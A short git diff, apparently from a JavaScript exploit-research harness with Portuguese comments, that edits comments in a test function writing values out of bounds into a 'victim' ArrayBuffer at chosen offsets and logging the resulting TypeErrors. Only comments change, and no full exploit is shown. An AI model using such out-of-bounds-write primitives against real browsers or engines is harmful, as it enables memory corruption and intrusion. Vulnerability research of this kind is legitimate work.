@@ -14,7 +14,7 @@ export async function executeFocusedTestForTypeError(
     testDescription,
     toJSONFunctionToUse, // A variante da função toJSON a ser testada
     valueToWriteOOB,     // O valor a ser escrito via OOB
-    corruptionOffsetToTest // NOVO PARÂMETRO: O offset específico para esta escrita OOB
+    corruptionOffsetToTest // O offset específico para esta escrita OOB
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
     logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
@@ -23,8 +23,8 @@ export async function executeFocusedTestForTypeError(
 
     current_toJSON_call_count_for_TypeError_test = 0; // Resetar para cada teste
 
-    const victim_ab_size_val = 64; // Tamanho padrão do victim_ab
-    const bytes_to_write_val = 4;  // Para 0xFFFFFFFF
+    const victim_ab_size_val = 64;
+    const bytes_to_write_val = 4;  // Assumindo que os valores de teste são de 4 bytes
     const ppKey_val = 'toJSON';
 
     await triggerOOB_primitive();
